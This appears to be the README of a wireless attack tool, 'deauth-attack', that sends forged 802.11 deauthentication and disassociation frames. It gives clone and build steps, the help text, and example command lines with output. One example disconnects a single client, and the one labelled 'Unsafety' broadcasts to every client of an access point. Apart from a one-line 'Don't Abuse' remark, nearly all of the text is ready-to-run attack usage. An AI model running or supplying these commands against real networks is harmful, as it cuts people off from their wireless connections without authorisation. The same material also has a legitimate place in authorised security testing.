# Deauth/Disas Attack

2019/11/12(verifsec@gmail.com)

## Installation

```
# git clone https://github.com/verifsec/deauth-attack.git
# cd ./deauth-attack
# make
```

## Usage

```
# deauth-attack -h
Deauth/Disas Attack 1.02a by <verifsec@gmail.com>

usage: deauth-attack [-h] -i IFACE -b BSSID [-t TARGET] -m MODE

optional arguments:
  -h, --help            show this help message and exit
  -i IFACE, --iface IFACE
                        802.11 iface(monitor)
  -b BSSID, --bssid BSSID
                        APUT MAC Address
  -t TARGET, --target TARGET
                        STAUT MAC Address
  -m MODE, --mode MODE  "disas" or "deauth"
```

## Example

### Safety

```
# deauth-attack -i wlan0mon -b 00:23:69:XX:XX:XX -m disas -t 34:97:f6:YY:YY:YY
Deauth/Disas Attack 1.02a by <verifsec@gmail.com>

[+] Starting now ...
[|] Sending the disas flame from 00:23:69:XX:XX:XX to 34:97:f6:YY:YY:YY
[+] Finish. Hopefully it's nothing.
```

### Unsafety

```
# deauth-attack -i wlan0mon -b 00:23:69:1D:60:22 -m disas
Deauth/Disas Attack 1.02a by <verifsec@gmail.com>

[+] Starting now ...
[|] Sending the disas flame from 00:23:69:1D:60:22 to ff:ff:ff:ff:ff:ff
[+] Finish. Hopefully it's nothing.
```

## License
This software includes the work that is distributed in the Apache License 2.0.

## Remark
Don't Abuse.
